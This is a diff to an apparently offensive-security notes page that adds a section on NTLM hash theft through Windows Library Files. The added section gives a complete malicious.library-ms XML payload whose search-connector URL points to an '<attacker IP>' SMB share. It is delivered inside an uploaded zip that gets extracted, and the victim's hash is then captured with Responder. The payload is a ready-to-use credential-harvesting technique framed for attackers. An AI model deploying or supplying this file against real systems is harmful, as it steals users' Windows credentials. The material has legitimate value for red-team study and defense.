@@ -44,7 +44,39 @@
 <li>Windows Library Files (.library-ms)</li>
 <li>Windows Search Connectors (.searchConnector-ms)</li>
 </ul>
-<p>Source: <a href="https://www.mdsec.co.uk/2021/02/farming-for-red-teams-harvesting-netntlm/">MDSec</a></p>
+<h4 id="windows-library-files">Windows Library Files</h4>
+<p>Uploading a zip file that gets extracted, where zip contains <code>malicious.library-ms</code>:</p>
+<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>&lt;?xml version<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;1.0&#34;</span> encoding<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;UTF-8&#34;</span>?&gt;
+</span></span><span style="display:flex;"><span>&lt;libraryDescription xmlns<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;http://schemas.microsoft.com/windows/2009/library&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>  &lt;searchConnectorDescriptionList&gt;
+</span></span><span style="display:flex;"><span>    &lt;searchConnectorDescription&gt;
+</span></span><span style="display:flex;"><span>      &lt;simpleLocation&gt;
+</span></span><span style="display:flex;"><span>        &lt;url&gt;<span style="color:#ae81ff">\\</span>&lt;attacker IP&gt;<span style="color:#ae81ff">\s</span>hared&lt;/url&gt;
+</span></span><span style="display:flex;"><span>      &lt;/simpleLocation&gt;
+</span></span><span style="display:flex;"><span>    &lt;/searchConnectorDescription&gt;
+</span></span><span style="display:flex;"><span>  &lt;/searchConnectorDescriptionList&gt;
+</span></span><span style="display:flex;"><span>&lt;/libraryDescription&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>We harvest the hash with Responder:</p>
+<figure><img src="/images/ntlm_harvest.png">
+</figure>
+
+<p>Sources: <a href="https://www.mdsec.co.uk/2021/02/farming-for-red-teams-harvesting-netntlm/">MDSec </a><a href="https://cti.monster/blog/2025/03/18/CVE-2025-24071.html">cti.monster</a></p>
 
       </div>
       
